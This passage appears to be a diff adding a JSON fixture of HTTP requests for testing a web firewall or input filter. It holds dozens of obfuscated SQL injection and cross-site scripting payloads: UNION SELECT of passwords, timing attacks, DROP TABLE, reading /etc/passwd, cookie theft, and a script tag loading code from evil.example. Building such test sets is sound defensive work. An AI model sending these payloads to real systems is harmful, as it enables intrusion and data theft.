+    "body": "{\"user\": {\"name\": \"1 UNION SELECT username, password FROM users\"}, \"tags\": [\"a\", \"1 UNION SELECT username, password FROM users\"]}"
+  },
+  {
+    "name": "injection variant 153 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "81"
+      ]
+    ],
+    "body": "comment=%3Cimg%20s%5C72%20c%3Dx%5C20%20onerr%5C6f%20r%3Dalert%281%5C29%20%3E&ok=1"
+  },
+  {
+    "name": "injection variant 154 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3C%21--%5Bif%2F%2A%2A%2Fgte%2F%2A%2A%2FIE%2F%2A%2A%2F4%5D%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%21%5Bendif%5D--%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 155 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "289"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1 UNIO\\\\116 SELECT \\\\165\\\\u0073\\\\145\\\\162na\\\\u006d\\\\x65,\\\\x20\\\\u0070as\\\\u0073w\\\\157rd \\\\106R\\\\u004fM \\\\165\\\\163\\\\145\\\\u0072s\"}, \"tags\": [\"a\", \"1 UNIO\\\\116 SELECT \\\\165\\\\u0073\\\\145\\\\162na\\\\u006d\\\\x65,\\\\x20\\\\u0070as\\\\u0073w\\\\157rd \\\\106R\\\\u004fM \\\\165\\\\163\\\\145\\\\u0072s\"]}"
+  },
+  {
+    "name": "injection variant 156 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20AND%20SLEEP%20%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 157 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "29"
+      ]
+    ],
+    "body": "comment=price%3A%2010-20&ok=1"
+  },
+  {
+    "name": "injection variant 158 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1\\x20AND\\x20\\x53L\\x45\\105\\120\\505\\51"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 159 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 OR pg_sleep(5)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 160 (arg name)",
+    "method": "GET",
+    "uri": "/item?se%5Cx6ce%5Cu0063t%20l%5Cu006fad_file%28%27%5C57et%5Cu0063%5C57passw%5C144%5Cu0027%5Cu0029=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 161 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "91"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<script>alert(1)</script>\"}, \"tags\": [\"a\", \"<script>alert(1)</script>\"]}"
+  },
+  {
+    "name": "injection variant 162 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "139"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\\\\x3csv\\\\x67 o\\\\156lo\\\\141d\\\\u003dalert(1)\\\\u003e\"}, \"tags\": [\"a\", \"\\\\x3csv\\\\x67 o\\\\156lo\\\\141d\\\\u003dalert(1)\\\\u003e\"]}"
+  },
+  {
+    "name": "injection variant 163 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "96"
+      ]
+    ],
+    "body": "comment=%2522%253E%253Cscript%253Efetch%2528%2527%252F%252Fx%2527%2529%253C%252Fscript%253E&ok=1"
+  },
+  {
+    "name": "injection variant 164 (arg name)",
+    "method": "GET",
+    "uri": "/item?https%3A%2F%2Fexample.com%2Fa%3Fb%3Dc=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 165 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "56"
+      ]
+    ],
+    "body": "comment=%3Csv%5C147%20onload%3D%5Cx61lert%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 166 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "305"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<\\\\5c \\\\31 51\\\\6d \\\\5c x67\\\\20 \\\\73 \\\\16\\\\32 \\\\63 =x o\\\\u\\\\30 \\\\30 6ee\\\\5c 162\\\\\\\\78 72\\\\\\\\31 \\\\35 7r=alert(\\\\\\\\78 3\\\\31 \\\\51\\\\5c 76\"}, \"tags\": [\"a\", \"<\\\\5c \\\\31 51\\\\6d \\\\5c x67\\\\20 \\\\73 \\\\16\\\\32 \\\\63 =x o\\\\u\\\\30 \\\\30 6ee\\\\5c 162\\\\\\\\78 72\\\\\\\\31 \\\\35 7r=alert(\\\\\\\\78 3\\\\31 \\\\51\\\\5c 76\"]}"
+  },
+  {
+    "name": "injection variant 167 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3CDiv%20StYLE%3D%22wiDth%3AExprEsSIoN%28ALeRT%281%29%29%22%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 168 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e1union%20select",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 169 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1e1union select"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 170 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%20OR%201%3D1%23",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 171 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<iMG SRc=x oNeRroR=aLeRT(1)>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 172 (query)",
+    "method": "GET",
+    "uri": "/item?id=%253cdIv%2520styLE%253D%2522widtH%253aeXprESsIoN%2528aLErT%25281%2529%2529%2522%253e",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 173 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 A\\1\\31 \\36 \\44 \\5c \\78 20\\53 \\4c \\\\75 00\\34 5EP(\\35 )"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 174 (query)",
+    "method": "GET",
+    "uri": "/item?id=SeLECt%2F%2Ax%2A%2FA%2F%2AX%2A%2FcOLOuR",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 175 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 176 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cbody%20onload%3Deval%28atob%28%27YQ%3D%3D%27%29%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 177 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%5Cu0020AN%5Cu0044%20B%5Cu0045NCH%5C115ARK%5Cu0028%5Cu0031%5Cu003000%5Cu003000%2CMD%5Cx35%281%29%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 178 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%26%2332%3Bload%26%2395file%26%2340%3B%27%26%23x2f%3Betc%2Fpasswd%27%26%23x29%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 179 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "72"
+      ]
+    ],
+    "body": "comment=%3Csv%5C67%20%20o%5C6e%20load%5C3d%20aler%5C74%20%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 180 (query)",
+    "method": "GET",
+    "uri": "/item?id=%257B%257Bconstructor.constructor%2528%2527alert%25281%2529%2527%2529%2528%2529%257D%257D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 181 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "%27%2F%2Ax%2A%2FUNION%2F%2Ax%2A%2FALL%2F%2Ax%2A%2FSELECT%2F%2Ax%2A%2FNULL%2CNULL--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 182 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref='%3b DRoP TabLE uSERs--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 183 (arg name)",
+    "method": "GET",
+    "uri": "/item?%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 184 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1 UNION SELECT username, password FROM users"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 185 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%2527%2520OR%2520%25271%2527%253D%25271",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 186 (query)",
+    "method": "GET",
+    "uri": "/item?id=T%5C68%20e%5C20%20union%26%23%5C78%20%5C32%200%3B%5C6f%20f%5C26%20%2332%5C74%20w%5C6f%20%26%2332%3Bsets",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 187 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "58"
+      ]
+    ],
+    "body": "comment=1%20AND%20BENCHMARK%281000000%2CMD5%281%29%29&ok=1"
+  },
+  {
+    "name": "injection variant 188 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "112"
+      ]
+    ],
+    "body": "comment=x%2527%252F%252A%252A%252FAND%252F%252A%252A%252F1%253DCONVERT%2528int%252C%2540%2540version%2529--&ok=1"
+  },
+  {
+    "name": "injection variant 189 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ca%20%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 190 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<body onload=eval(atob('YQ=='))>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 191 (query)",
+    "method": "GET",
+    "uri": "/item?id=JAvASCRIpT%3AaLeRT%28dOCUmEnt.CoOKiE%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 192 (path)",
+    "method": "GET",
+    "uri": "/page/%3Cimg%2F%2A%2A%2Fsrc%3Dx%2F%2A%2A%2Fonerror%3Dalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 193 (query)",
+    "method": "GET",
+    "uri": "/item?id=%26%2360a%20href%3D%26%23x22%3Bjavascript%26colon%3Bconfirm%281%29%26%23x22%3B%3Ex%26LT%2Fa%26%2362",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 194 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<d\\69 v&#32;s&#9274&#32yle=\"widt&#92;68 :ex&#9270 &#9272 ession(\\61 l&#9265 rt(\\31&#32&#41&#41;&#34;>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 195 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "52"
+      ]
+    ],
+    "body": "comment=javascript%3Aalert%28document.cookie%29&ok=1"
+  },
+  {
+    "name": "injection variant 196 (path)",
+    "method": "GET",
+    "uri": "/page/I%5C74%20%27%5C73%20%205%20o%5C27%20cloc%5C6b%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 197 (path)",
+    "method": "GET",
+    "uri": "/page/%3Cscript%20src%3D%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 198 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "104"
+      ]
+    ],
+    "body": "comment=1%2527%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%2529--&ok=1"
+  },
+  {
+    "name": "injection variant 199 (path)",
+    "method": "GET",
+    "uri": "/page/%3Ca%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 200 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "119"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"setTim\\\\65 \\\\6f u\\\\74 \\\\28 al\\\\65 rt,1)\"}, \"tags\": [\"a\", \"setTim\\\\65 \\\\6f u\\\\74 \\\\28 al\\\\65 rt,1)\"]}"
+  },
+  {
+    "name": "injection variant 201 (path)",
+    "method": "GET",
+    "uri": "/page/1%20OR%20pg_sleep%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 202 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 203 (arg name)",
+    "method": "GET",
+    "uri": "/item?a%09%3C%09b%09and%09b%09%3E%09c=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 204 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "77"
+      ]
+    ],
+    "body": "comment=%5C31%20%20%5C4f%20%5C52%20%5C20%20pg_%5C73%20leep%28%5C35%20%29&ok=1"
+  },
+  {
+    "name": "injection variant 205 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=price:  10-20"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 206 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "\\u0049\\u0074'\\163 5 o\\47c\\x6c\\u006fck"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 207 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "44"
+      ]
+    ],
+    "body": "comment=1e1union%20se%5C6c%20ec%5C74%20&ok=1"
+  },
+  {
+    "name": "injection variant 208 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%2527%2520OR%2520%25271%2527%253D%25271=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 209 (query)",
+    "method": "GET",
+    "uri": "/item?id=",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 210 (arg name)",
+    "method": "GET",
+    "uri": "/item?s%5C145l%5C145ct%20a%5C40col%5C157%5Cx75%5Cu0072=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 211 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3CdIv%20sTYLe%20%3D%20%22WidtH%3AeXPRESsioN%20%28AleRt%20%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 212 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "45"
+      ]
+    ],
+    "body": "comment=1%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1&ok=1"
+  },
+  {
+    "name": "injection variant 213 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "\\u0049t's \\u0035 o'cl\\157ck"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 214 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%7C%7C%28SELECT%2F%2Ax%2A%2F1%2F%2Ax%2A%2FFROM%2F%2Ax%2A%2Fdual%29%7C%7C%27",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 215 (path)",
+    "method": "GET",
+    "uri": "/page/1%20OR%20pg_sleep%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 216 (query)",
+    "method": "GET",
+    "uri": "/item?id=%2522%253E%253Cscript%253Efetch%2528%2527%252F%252Fx%2527%2529%253C%252Fscript%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 217 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%20O%5Cx52%5C40%5C61%3D1%5C43",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 218 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "{\\22 \\24 n\\65 \": null}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 219 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%20OR%201%3D1%23",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 220 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Cscript%3Ealert%281%29%3C%2Fscript%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 221 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 AND BENCHMARK(1000000,MD5(1))"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 222 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20UNioN%20SeLEcT%20uSErNaME%2C%20PaSsword%20from%20Users",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 223 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "59"
+      ]
+    ],
+    "body": "comment=%26%23x27%3B%20OR%26%23x20%3B1%3D1%26%23x23%3B&ok=1"
+  },
+  {
+    "name": "injection variant 224 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "55"
+      ]
+    ],
+    "body": "comment=%3Csvg%20onload%20%3D%20alert%20%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 225 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1 uNIOn seLECt UsErnaMe, paSswORD FRoM USeRS"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 226 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=setTimeout(alert,1)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 227 (cookie)",
+    "method": "GET",
+    "uri": "/",
